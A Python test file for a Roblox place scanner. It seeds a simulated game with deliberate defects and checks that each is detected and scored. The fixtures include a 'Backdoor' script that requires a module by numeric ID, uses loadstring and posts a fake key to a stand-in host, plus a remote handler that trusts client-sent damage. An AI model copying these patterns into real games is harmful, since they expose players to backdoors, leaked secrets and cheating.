#!/usr/bin/env python3
"""Execute the Benchmark pack (1.99.6) against the miniature Roblox DataModel.

Builds a place with every class of defect the rubric knows - unhandled and
unvalidated remotes, a client-trusted damage handler, DataStore calls without
pcall / BindToClose / PlayerRemoving, a numeric require, loadstring, a bearer
token, a while-true-wait loop, GetDescendants inside Heartbeat, Touched without
debounce, hot emitters, _G, a LocalScript in ServerScriptService, dead buttons,
fixed TextSize and an offset-only root - then runs bench_run, fixes a chunk of
it in Lua, runs again and asserts the score, the findings and the stored delta
move the way a reviewer would expect.

    pip install lupa && python3 tests/bench-sim.py          (from the TotalScript root)
"""
import json, os, subprocess, sys

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
os.chdir(ROOT)
sys.path.insert(0, os.path.join(ROOT, "tests"))
try:
    from roblox_sim import make_runtime
except Exception as e:  # pragma: no cover
    print("SKIP  " + str(e))
    sys.exit(0)
try:
    import lupa  # noqa: F401
except Exception:  # pragma: no cover
    print("SKIP  lupa is not installed (pip install lupa)")
    sys.exit(0)

GEN = r"""
const fs=require("fs"), vm=require("vm");
global.window=global; global.chrome={storage:{local:{get:(k,cb)=>cb&&cb({}),set:()=>{}}},runtime:{getURL:(p)=>p}};
const manifest=JSON.parse(fs.readFileSync("manifest.json","utf8"));
const bundle=manifest.content_scripts.find(c=>c.js&&c.js.includes("src/core/skills/studio_skills.js"));
for(const f of bundle.js.filter(f=>/src\/core\/(skills\/|studio_bridge\.js)/.test(f))) vm.runInThisContext(fs.readFileSync(f,"utf8"),{filename:f});
const S=RobloxScriptSkills;
const out={commands:S.BENCH_COMMANDS, checks:S.BENCH_CHECKS, cats:S.BENCH_CATEGORIES, pass:S.BENCH_PASS_SCORE, version:S.BENCH_VERSION, programs:{}, targets:S.benchTargetsLocal({}), targets_sec:S.benchTargetsLocal({category:"security"})};
const want=JSON.parse(process.argv[1]);
for(const [key,[op,args]] of Object.entries(want)){ const r=S.buildLuau(op,args); out.programs[key]=r.code||("--ERR "+r.err); }
process.stdout.write(JSON.stringify(out));
"""

PROGRAMS = {
    "run_empty": ["bench_run", {}],
    "run_bad": ["bench_run", {"label": "baseline"}],
    "run_bad_nosave": ["bench_run", {"save": False}],
    "run_security": ["bench_run", {"suite": "security"}],
    "run_ui_path": ["bench_run", {"path": "StarterGui.Shop"}],
    "run_script_path": ["bench_run", {"path": "ServerScriptService.Saver"}],
    "run_after": ["bench_run", {"label": "after fixes"}],
    "run_final": ["bench_run", {}],
    "run_bad_path": ["bench_run", {"path": "Workspace.Nope"}],
    "run_bad_suite": ["bench_run", {"suite": "looks"}],
    "history": ["bench_history", {}],
    "history_empty": ["bench_history", {}],
    "history_clear": ["bench_history", {"clear": True}],
    "targets_luau": ["bench_targets", {"category": "performance"}],
}

data = json.loads(subprocess.check_output(["node", "-e", GEN, json.dumps(PROGRAMS)], text=True))
L, M, run_program = make_runtime()
results = []


def ok(name, cond, detail=""):
    results.append(bool(cond))
    print(("PASS  " if cond else "FAIL  ") + name + ("" if cond or not detail else " — " + str(detail)[:700]))


def run(key):
    return run_program(key, data["programs"][key])


def finding(res, kind):
    return next((f for f in res["data"]["findings"] if f["id"] == kind), None)


def kinds(res):
    return sorted(f["id"] for f in res["data"]["findings"])


# ───────────────────────── catalogue + rubric ─────────────────────────
ok("3 bench commands registered", data["commands"] == ["bench_targets", "bench_run", "bench_history"], data["commands"])
ok("33 checks across 5 categories, pass 85, version 1.99.6", len(data["checks"]) == 33 and data["cats"] == ["security", "performance", "robustness", "architecture", "ui_wiring"] and data["pass"] == 85 and data["version"] == "1.99.6", (len(data["checks"]), data["cats"], data["pass"], data["version"]))
T = data["targets"]
ok("bench_targets lists every check with weight + fix and the category weights sum to 100", T["ok"] and sum(c["weight"] for c in T["data"]["categories"]) == 100 and sum(len(c["checks"]) for c in T["data"]["categories"]) == 33 and all(k["fix"] and k["weight"] > 0 for c in T["data"]["categories"] for k in c["checks"]), json.dumps(T["data"])[:300])
ok("bench_targets security-only", data["targets_sec"]["ok"] and [c["id"] for c in data["targets_sec"]["data"]["categories"]] == ["security"] and "SECURITY (30%)" in data["targets_sec"]["text"])
ok("targets text leads with BENCH TARGETS and the workflow", T["text"].startswith("BENCH TARGETS 1.99.6") and "Workflow:" in T["text"] and "bench_run" in T["text"])
ok("unknown suite / path errors are build-time", data["programs"]["run_bad_suite"].startswith("--ERR") and "unknown suite" in data["programs"]["run_bad_suite"])
ok("no check names a NOT_IMPLEMENTED or unknown command in its fix", all(not any(bad in k["fix"] for bad in ("ui_wire_action", "script_delete ", "fx_preset", "property_set")) for c in T["data"]["categories"] for k in c["checks"]))

# ───────────────────────── empty place ─────────────────────────
r = run("history_empty")
ok("bench_history on a fresh place says run first", r.get("ok") and r["data"]["count"] == 0 and "bench_run first" in r["text"], r)
r = run("run_empty")
ok("bench_run on an empty place runs and scores 100 S with no findings", r.get("ok") and r["data"]["overall"] == 100 and r["data"]["grade"] == "S" and r["data"]["pass"] is True and r["data"]["total_findings"] == 0, r)
ok("text leads with BENCH n/100 and all five categories", str(r["text"]).startswith("BENCH 100/100 (S, pass)") and all(c in r["text"] for c in ("security 100", "performance 100", "robustness 100", "architecture 100", "ui_wiring 100")), r["text"])
ok("first run has no delta", r["data"].get("delta") is None and r["data"].get("previous") is None)

# ───────────────────────── build the bad place ─────────────────────────
L.execute(r"""
local game=_G.game or game
local WS=game:GetService('Workspace')
local RS=game:GetService('ReplicatedStorage')
local SSS=game:GetService('ServerScriptService')
local SG=game:GetService('StarterGui')
local SPS=game:GetService('StarterPlayer')
local base=Instance.new('Part') base.Name='Baseplate' base.Anchored=true base.Parent=WS
-- remotes
local r1=Instance.new('RemoteEvent') r1.Name='RemoteEvent' r1.Parent=RS           -- unhandled + default name
local r2=Instance.new('RemoteEvent') r2.Name='DealDamage' r2.Parent=RS            -- handled, unvalidated, trusts damage
local r3=Instance.new('RemoteFunction') r3.Name='BuyItem' r3.Parent=RS            -- handled + validated
local s=Instance.new('Script') s.Name='Combat' s.Parent=SSS
s.Source=[[local RS=game:GetService("ReplicatedStorage")
RS.DealDamage.OnServerEvent:Connect(function(player, target, damage)
  target.Humanoid:TakeDamage(damage)
end)
RS.BuyItem.OnServerInvoke=function(player, id)
  if typeof(id)~="string" then return false end
  return true
end
while true do wait(1) print("tick") end]]
local saver=Instance.new('Script') saver.Name='Saver' saver.Parent=SSS
saver.Source=[[local DSS=game:GetService("DataStoreService")
local store=DSS:GetDataStore("Main")
game.Players.PlayerAdded:Connect(function(p)
  local d=store:GetAsync(p.UserId)
  store:SetAsync(p.UserId, d or {})
  print("loaded") print("w") print("x") print("y") print("z") print("a") print("b") print("c") print("d") print("e") print("f") print("g") print("h")
end)]]
local door=Instance.new('Script') door.Name='Backdoor' door.Parent=SSS
door.Source=[[require(1234567890)
loadstring("print(1)")()
local api_key="EXAMPLE_TOKEN_NOT_REAL_0123456789abcdef"
local key=api_key
game:GetService("HttpService"):PostAsync("https://x.y/z", key)
_G.Config={}]]
local touch=Instance.new('Script') touch.Name='Lava' touch.Parent=base
touch.Source=[[script.Parent.Touched:Connect(function(hit) local h=hit.Parent:FindFirstChild("Humanoid") if h then h.Health=0 end end)
game:GetService("RunService").Heartbeat:Connect(function() for _,d in ipairs(workspace:GetDescendants()) do end end)]]
local stub=Instance.new('Script') stub.Name='Stub' stub.Source='-- TODO' stub.Parent=SSS
local off=Instance.new('Script') off.Name='Old' off.Source='print("old code here that is long enough")' off.Enabled=false off.Parent=SSS
local wrong=Instance.new('LocalScript') wrong.Name='ClientInServer' wrong.Parent=SSS
wrong.Source=[[local DSS=game:GetService("DataStoreService")
local ss=game:GetService("ServerStorage")]]
-- performance
for i=1,3 do local e=Instance.new('ParticleEmitter') e.Rate=900 e.Parent=base end
-- ui
local gui=Instance.new('ScreenGui') gui.Name='Shop' gui.Parent=SG
local root=Instance.new('Frame') root.Name='Main' root.Size=UDim2.new(0,400,0,300) root.Parent=gui
for i=1,3 do local b=Instance.new('TextButton') b.Name='Buy'..i b.Text='Buy' b.Parent=root end
local close=Instance.new('TextButton') close.Name='Close' close.Text='X' close.Parent=root
local l=Instance.new('TextLabel') l.Name='Title' l.Text='Shop' l.Parent=root
local ls=Instance.new('LocalScript') ls.Name='ShopClient' ls.Parent=gui
ls.Source=[[local gui=script.Parent
gui.Main.Close.Activated:Connect(function() gui.Enabled=false end)]]
""")

r = run("run_bad")
ok("bench_run on the bad place runs", r.get("ok"), r)
d = r["data"]
K = kinds(r)
print("      findings:", K, "score", d["overall"], d["categories"])
expected = ["remote_unhandled", "remote_unvalidated", "client_damage_trusted", "default_remote_names", "datastore_on_client", "require_by_id", "loadstring_used", "secret_in_script", "http_no_pcall", "busy_loop", "per_frame_scan", "touched_no_debounce", "datastore_no_pcall", "no_bind_to_close", "no_save_on_leave", "stub_scripts", "debug_prints", "disabled_scripts", "globals_used", "monolith", "script_misplaced", "server_api_on_client", "particles_hot", "dead_buttons", "text_not_scaled", "offset_only_root"]
missing = [k for k in expected if k not in K]
ok("every seeded defect is found (" + str(len(expected)) + " kinds)", not missing, "missing " + str(missing))
ok("no false positives on the clean checks", not any(k in K for k in ("part_budget", "unions_heavy", "decals_heavy", "shadow_lights", "script_per_part", "long_script", "no_connection_cleanup")), K)
ok("score is a failing grade and every category took damage", d["overall"] < 60 and d["grade"] in ("C", "D") and d["pass"] is False and all(d["categories"][c] < 100 for c in ("security", "performance", "robustness", "architecture", "ui_wiring")), (d["overall"], d["categories"]))
ok("security is wrecked - the backdoor + secret + trusted damage cost almost all of it", d["categories"]["security"] <= 20, d["categories"])
f = finding(r, "remote_unhandled")
ok("unhandled remote names the RemoteEvent and the real fix", f and f["count"] == 1 and "RS.RemoteEvent" in f["examples"] and "remote_handler" in f["fix"], f)
f = finding(r, "remote_unvalidated")
ok("only DealDamage is unvalidated - BuyItem's typeof check counts", f and f["count"] == 1 and f["examples"] == ["RS.DealDamage"], f)
f = finding(r, "client_damage_trusted")
ok("DealDamage handler trusts the client's damage number", f and f["examples"] == ["RS.DealDamage"], f)
f = finding(r, "dead_buttons")
ok("3 of 4 buttons are dead - Close is referenced by the LocalScript", f and f["count"] == 3 and "SG.Shop.Main.Close" not in f["examples"] and len(f["examples"]) == 3, f)
f = finding(r, "secret_in_script")
ok("the bearer-style key is caught", f and f["examples"] == ["SSS.Backdoor"], f)
f = finding(r, "particles_hot")
ok("particle budget counts 2700/s with hottest 900/s", f and "2700/s" in f["message"] and "900/s" in f["message"], f)
f = finding(r, "touched_no_debounce")
ok("Touched without debounce is flagged once", f and f["count"] == 1 and f["examples"] == ["WS.Baseplate.Lava"], f)
ok("findings are sorted by weight desc, each with an id / category / fix", all(r["data"]["findings"][i]["weight"] >= r["data"]["findings"][i + 1]["weight"] for i in range(len(r["data"]["findings"]) - 1)) and all(x["fix"] and x["category"] and x["severity"] for x in r["data"]["findings"]))
ok("text lists findings with category, weight and FIX", "-> FIX:" in r["text"] and "[security -" in r["text"] and r["text"].startswith("BENCH " + str(d["overall"]) + "/100"), r["text"][:300])
ok("delta vs the empty run is reported", d["delta"] == d["overall"] - 100 and d["previous"] == 100 and "delta -" in r["text"], (d.get("delta"), d.get("previous")))
ok("counts carry the inventory", d["counts"]["scripts"] == 8 and d["counts"]["remotes"] == 3 and d["counts"]["buttons"] == 4 and d["counts"]["server_scripts"] == 6 and d["counts"]["local_scripts"] == 2, d["counts"])

r2 = run("run_bad_nosave")
ok("save:false does not append to history", r2.get("ok") and r2["data"]["overall"] == d["overall"])
r3 = run("run_security")
ok("suite security scores only that category and skips the rest", r3.get("ok") and list(r3["data"]["categories"].keys()) == ["security"] and all(f["category"] == "security" for f in r3["data"]["findings"]) and r3["data"]["overall"] == d["categories"]["security"] and r3["data"].get("delta") is None, r3["data"])
r4 = run("run_ui_path")
ok("path StarterGui.Shop scopes to the GUI tree", r4.get("ok") and "dead_buttons" in kinds(r4) and "remote_unhandled" not in kinds(r4) and r4["data"]["scope"] == "StarterGui.Shop", kinds(r4))
r5 = run("run_script_path")
ok("path to one script scopes the script checks", r5.get("ok") and kinds(r5) == ["datastore_no_pcall", "debug_prints", "no_bind_to_close", "no_save_on_leave"], kinds(r5))
r6 = run("run_bad_path")
ok("unknown path fails cleanly", r6.get("ok") is False and "not found" in r6.get("error", ""), r6)

# ───────────────────────── fix a chunk of it ─────────────────────────
L.execute(r"""
local game=_G.game or game
local RS=game:GetService('ReplicatedStorage')
local SSS=game:GetService('ServerScriptService')
SSS.Backdoor:Destroy() SSS.Stub:Destroy() SSS.Old:Destroy() SSS.ClientInServer:Destroy()
RS.RemoteEvent.Name='RequestSpawn'
local h=Instance.new('Script') h.Name='SpawnHandler' h.Parent=SSS
h.Source=[[local RS=game:GetService("ReplicatedStorage")
local cooldown={}
RS.RequestSpawn.OnServerEvent:Connect(function(player, kind)
  if typeof(kind)~="string" then return end
  if cooldown[player] and os.clock()-cooldown[player]<1 then return end
  cooldown[player]=os.clock()
end)]]
SSS.Combat.Source=[[local RS=game:GetService("ReplicatedStorage")
local WEAPONS={Sword=15}
RS.DealDamage.OnServerEvent:Connect(function(player, target, weapon)
  if typeof(weapon)~="string" or not WEAPONS[weapon] then return end
  local dmg=math.clamp(WEAPONS[weapon],0,100)
  target.Humanoid:TakeDamage(dmg)
end)
RS.BuyItem.OnServerInvoke=function(player, id) if typeof(id)~="string" then return false end return true end]]
SSS.Saver.Source=[[local DSS=game:GetService("DataStoreService")
local store=DSS:GetDataStore("Main")
local function save(p) local ok,err=pcall(function() store:UpdateAsync(p.UserId,function(old) return old or {} end) end) if not ok then warn(err) end end
game.Players.PlayerAdded:Connect(function(p) local ok,d=pcall(function() return store:GetAsync(p.UserId) end) end)
game.Players.PlayerRemoving:Connect(save)
game:BindToClose(function() for _,p in ipairs(game.Players:GetPlayers()) do save(p) end end)]]
local m=Instance.new('ModuleScript') m.Name='Config' m.Source='return {Version=1}' m.Parent=RS
local m2=Instance.new('ModuleScript') m2.Name='Util' m2.Source='local U={} function U.clamp(x) return math.clamp(x,0,1) end return U' m2.Parent=RS
""")
r = run("run_after")
a = r["data"]
K2 = kinds(r)
print("      after:", K2, "score", a["overall"], a["categories"])
ok("after the fixes the score rises and the delta is positive", r.get("ok") and a["overall"] > d["overall"] + 30 and a["delta"] == a["overall"] - d["overall"] and a["previous"] == d["overall"] and "delta +" in r["text"], (a["overall"], a.get("delta"), a.get("previous")))
ok("security recovered: no remote / backdoor / secret findings", a["categories"]["security"] >= 85 and not any(k in K2 for k in ("remote_unhandled", "remote_unvalidated", "client_damage_trusted", "require_by_id", "loadstring_used", "secret_in_script", "http_no_pcall", "datastore_on_client")), (a["categories"], K2))
ok("robustness recovered: pcall + BindToClose + PlayerRemoving seen", not any(k in K2 for k in ("datastore_no_pcall", "no_bind_to_close", "no_save_on_leave", "stub_scripts", "debug_prints", "disabled_scripts")), K2)
ok("architecture: modules now present, _G / misplaced gone, remote names fixed", not any(k in K2 for k in ("monolith", "globals_used", "script_misplaced", "default_remote_names", "server_api_on_client")), K2)
ok("the untouched defects are still reported (busy loop gone with Combat rewrite; Touched / per-frame / particles / UI remain)", all(k in K2 for k in ("touched_no_debounce", "per_frame_scan", "particles_hot", "dead_buttons", "text_not_scaled", "offset_only_root")) and "busy_loop" not in K2, K2)

# ───────────────────────── history ─────────────────────────
r = run("history")
ok("history lists 3 saved runs (empty, baseline, after) with labels and a positive trend", r.get("ok") and r["data"]["count"] == 3 and [x.get("label", "") for x in r["data"]["runs"]] == ["", "baseline", "after fixes"] and r["data"]["runs"][1]["overall"] == d["overall"] and r["data"]["runs"][2]["overall"] == a["overall"] and "[baseline]" in r["text"] and "Trend:" in r["text"], r)
ok("history runs carry per-category scores and grades", all("cats" in x and "grade" in x and len(x["cats"]) == 5 for x in r["data"]["runs"]), r["data"]["runs"][0])
r = run("history_clear")
ok("clear removes the history", r.get("ok") and r["data"]["cleared"] is True and run("history")["data"]["count"] == 0)
r = run("run_final")
ok("after clearing, the next run has no delta again and re-creates the store", r.get("ok") and r["data"].get("delta") is None and run("history")["data"]["count"] == 1)
r = run("targets_luau")
ok("bench_targets via Luau returns the performance rubric", r.get("ok") and [c["id"] for c in r["data"]["categories"]] == ["performance"] and len(r["data"]["categories"][0]["checks"]) == 9, r)

print("\n%d/%d checks passed" % (sum(results), len(results)))
sys.exit(0 if all(results) else 1)
